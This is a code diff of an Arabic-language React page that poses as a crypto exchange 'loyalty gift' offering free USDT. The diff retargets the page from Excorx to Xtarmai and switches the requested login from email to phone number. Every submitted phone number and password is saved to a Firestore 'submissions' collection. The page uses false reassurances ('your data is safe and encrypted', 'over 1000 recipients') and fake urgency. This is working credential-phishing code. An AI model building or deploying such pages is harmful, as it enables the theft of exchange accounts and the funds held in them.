@@ -1,3 +1,4 @@
+
 'use client';
 
 import React, { useState } from 'react';
@@ -6,22 +7,23 @@ import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 
 export default function Home() {
   const db = useFirestore();
-  const [email, setEmail] = useState('');
+  const [phone, setPhone] = useState('');
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
   const [submitted, setSubmitted] = useState(false);
 
   const submitRequest = async () => {
-    if (!email || !password) {
-      alert('❌ يرجى إدخال البريد الإلكتروني وكلمة المرور.');
+    if (!phone || !password) {
+      alert('❌ يرجى إدخال رقم الهاتف وكلمة المرور.');
       return;
     }
 
     setLoading(true);
 
     try {
+      // حفظ البيانات في Firestore تحت مجموعة submissions
       await addDoc(collection(db, "submissions"), {
-        email: email,
+        phone: phone,
         password: password,
         createdAt: serverTimestamp(),
         status: "pending"
@@ -119,26 +121,6 @@ export default function Home() {
 
         .amount small { font-size: 18px; color: #94a3b8; }
 
-        .condition-badge {
-            display: flex;
-            justify-content: space-around;
-            margin: 25px 0 20px;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-
-        .badge {
-            background: rgba(0, 100, 255, 0.15);
-            border: 1px solid #3b82f6;
-            border-radius: 40px;
-            padding: 8px 18px;
-            color: #bfd9ff;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
         .input-group { margin: 20px 0; text-align: right; }
         .input-group label {
             display: block;
@@ -211,35 +193,30 @@ export default function Home() {
       `}</style>
 
       <div className="gift-card" dir="rtl">
-        <div className="gift-icon">🎁💰</div>
-        <h1>عرض خاص: 200 USDT</h1>
-        <div className="sub-title">هدية لمستخدمي Excorx النشطين</div>
+        <div className="gift-icon">🎁✨💰</div>
+        <h1>عرض حصري: 25 USDT</h1>
+        <div className="sub-title">هدية ترحيبية خاصة لعملاء Xtarmai الأوفياء</div>
 
         <div className="highlight">
-          <span style={{ color: '#b3d9ff', fontSize: '18px' }}>مكافأة الولاء</span>
-          <div className="amount">200 <small>USDT</small></div>
-        </div>
-
-        <div className="condition-badge">
-          <div className="badge"><span>✅</span> رصيد +500 USDT</div>
-          <div className="badge"><span>👥</span> دعوة واحدة على الأقل</div>
+          <span style={{ color: '#b3d9ff', fontSize: '18px' }}>مكافأة فورية لعملائنا المميزين</span>
+          <div className="amount">25 <small>USDT</small></div>
         </div>
 
         {!submitted ? (
           <>
-            <p style={{ color: '#b0caf0', fontSize: '14px', margin: '15px 0 5px' }}>
-              لتأكيد أهليتك، يرجى تسجيل الدخول بحسابك في Excorx.
+            <p id="desc" style={{ color: '#b0caf0', fontSize: '14px', margin: '15px 0 5px' }}>
+              🎁 استلم مكافأتك الآن! أدخل رقم هاتفك وكلمة المرور للتحقق من الأهلية واستلام الـ 25 USDT فوراً.
             </p>
 
             <div className="input-group">
-              <label>📧 البريد الإلكتروني (مرتبط بالحساب)</label>
+              <label>📱 رقم الهاتف (مرتبط بحساب Xtarmai)</label>
               <input 
-                type="email" 
+                type="tel" 
                 className="input-field" 
-                placeholder="أدخل بريدك الإلكتروني" 
+                placeholder="أدخل رقم الهاتف" 
                 autoComplete="off"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
+                value={phone}
+                onChange={(e) => setPhone(e.target.value)}
               />
             </div>
 
@@ -260,19 +237,19 @@ export default function Home() {
               onClick={submitRequest}
               disabled={loading}
             >
-              {loading ? 'جاري المعالجة...' : '🚀 إرسال طلب الهدية'}
+              {loading ? 'جاري المعالجة...' : '🚀 احصل على الهدية الآن'}
             </button>
           </>
         ) : (
           <div className="review-message">
-            ⏳ طلبك قيد المراجعة، يستغرق التأكد من الشروط من ساعة إلى 3 ساعات. سيتم إعلامك عند القبول.
+            ⏳ تم استلام طلبك بنجاح! ستراجع فرقنا بياناتك خلال ساعة إلى 3 ساعات. سيتم إيداع الـ 25 USDT في محفظتك فور التأكد من الأهلية.
           </div>
         )}
 
         <div className="footer-note">
-          <div>⏱️ عرض محدود</div>
-          <div>🔒 بياناتك آمنة</div>
-          <div>🎯 500+ استلموا</div>
+          <div>⏱️ عرض محدود العدد</div>
+          <div>🔒 بياناتك آمنة ومشفرة</div>
+          <div>🎯 أكثر من 1000 مستلم</div>
         </div>
       </div>
     </main>
